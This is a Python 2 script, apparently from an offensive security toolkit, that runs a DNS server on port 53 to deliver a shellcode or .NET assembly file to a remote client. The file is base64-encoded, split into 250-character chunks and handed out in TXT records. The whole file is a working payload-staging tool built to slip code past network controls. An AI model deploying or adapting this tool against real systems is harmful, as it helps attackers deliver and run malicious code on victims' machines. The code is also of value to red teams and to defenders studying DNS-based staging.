#!/usr/bin/python
# -*- coding: utf8 -*-

# Author: Arno0x0x - https://twitter.com/Arno0x0x
#
# This tool is distributed under the terms of the [GPLv3 licence](http://www.gnu.org/copyleft/gpl.html)

import argparse
import socket
from dnslib import *
from base64 import b64encode

#======================================================================================================
#											HELPERS FUNCTIONS
#======================================================================================================

#------------------------------------------------------------------------
def chunks(s, n):
	for i in xrange(0, len(s), n):
		yield s[i:i+n]
		
#------------------------------------------------------------------------
def color(string, color=None):  
    attr = []
    # bold
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string

#======================================================================================================
#											MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':
	#------------------------------------------------------------------------
	# Parse arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("type", help="Type of content to be delivered over the DNS channel", choices=['shellcode', 'assembly'])
	parser.add_argument("filename", help="Name of the file to be delivered over DNS")
	args = parser.parse_args() 

	#------------------------------------------------------------------------
	# Open shellcode file and read all bytes from it
	try:
		with open(args.filename) as fileHandle:
			fileBytes = bytearray(fileHandle.read())
			fileHandle.close()
			print color("[*] File [{}] successfully loaded".format(args.filename))
	except IOError:
		print color("[!] Could not open or read file [{}]".format(args.filename))
		quit()

	# Split a base64 encoded file representation to 250 chars long chunks of strings
	chunks = list(chunks(b64encode(fileBytes), 250))
	print color("[*] Data split into [{}] chunks of 250 bytes".format(len(chunks)))
	
	# Setup a UDP server listening on port UDP 53	
	udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	udps.bind(('',53))
	print color("[*] DNS server listening on port 53")
	print color("[*] Serving [{}] advertised as a [{}] data type".format(args.filename,args.type))
	
	try:
		while True:
			data, addr = udps.recvfrom(1024)
			request = DNSRecord.parse(data)
			print color("[+] Received query: [{}] - Type: [{}]".format(request.q.qname, request.q.qtype))
						
			#-----------------------------------------------------------------------------
			# Check if it is the initialization request
			if request.q.qname.matchGlob("init.*"):
				reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
				reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(b64encode("{}|{}".format(args.type, len(chunks))))))
			
			#-----------------------------------------------------------------------------
			# Else it should be a request for one of the chunk of data
			else:
				r = str(request.q.qname).split(".")[0]
				try:
					chunkRequested = int(r)
					reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
					reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunks[chunkRequested])))
				except ValueError:
					print color("[!] Unknown request [{}]".format(r))
				except IndexError:
					print color("[!] Invalid chunk requested [{}]".format(chunkRequested))

			#-----------------------------------------------------------------------------		
			# Finally send the response back
			udps.sendto(reply.pack(), addr)
	except KeyboardInterrupt:
		pass
	finally:
		print color("[!] Stopping DNS Server")
		udps.close()
